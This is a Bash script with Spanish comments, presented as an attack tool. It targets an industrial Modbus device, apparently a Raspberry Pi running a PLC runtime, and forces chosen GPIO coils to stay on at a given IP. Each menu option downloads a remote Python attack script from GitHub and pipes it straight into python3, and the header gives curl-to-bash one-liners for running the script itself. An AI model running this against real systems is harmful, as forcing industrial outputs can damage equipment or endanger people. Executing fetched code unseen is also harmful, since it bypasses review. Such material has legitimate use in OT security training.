#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para atacar mediante Modbus el GPIO de la Rasberry Pi desde Debian
#
# Ejecución remota (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO.sh | bash -s IPDestino
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO.sh | sed 's-sudo--g' | bash -s IPDestino
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO.sh | nano -
# ----------

vIP="$1"

# Crear el menú
  # Comprobar si el paquete dialog está instalado. Si no lo está, instalarlo.
    if [[ $(dpkg-query -s dialog 2>/dev/null | grep installed) == "" ]]; then
      echo ""
      echo -e "${cColorRojo}  El paquete dialog no está instalado. Iniciando su instalación...${cFinColor}"
      echo ""
      sudo apt-get -y update
      sudo apt-get -y install dialog
      echo ""
    fi
  menu=(dialog --checklist "La bobina de que entrada quieres mantener encendida?" 21 56 1)
    opciones=(
      1 "%QX0.0" off
      2 "%QX0.1" off
      3 "%QX0.2" off
      4 "%QX0.3" off
      5 "%QX0.4" off
      6 "%QX0.5" off
      7 "%QX0.6" off
      8 "%QX0.7" off
      9 "%QX1.0" off
     10 "%QX1.1" off
     11 "%QX1.2" off
    )
  choices=$("${menu[@]}" "${opciones[@]}" 2>&1 >/dev/tty)
  for choice in $choices
    do
      case $choice in

        1)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX0.0..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.0'

        ;;

        2)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX0.1..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.1'

        ;;

        3)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX0.2..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.2'

        ;;

        4)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX0.3..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.3'

        ;;

        5)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX0.4..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.4'

        ;;

        6)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX0.5..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.5'

        ;;

        7)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX0.6..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.6'

        ;;

        8)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX0.7..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.7'

        ;;

        9)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX1.0..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.0'

        ;;

       10)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX1.1..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.1'

        ;;

       11)

          echo ""
          echo "  Manteniendo encendida la bobina de la dirección %QX1.2..."
          echo ""
          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.2'

        ;;

    esac

done
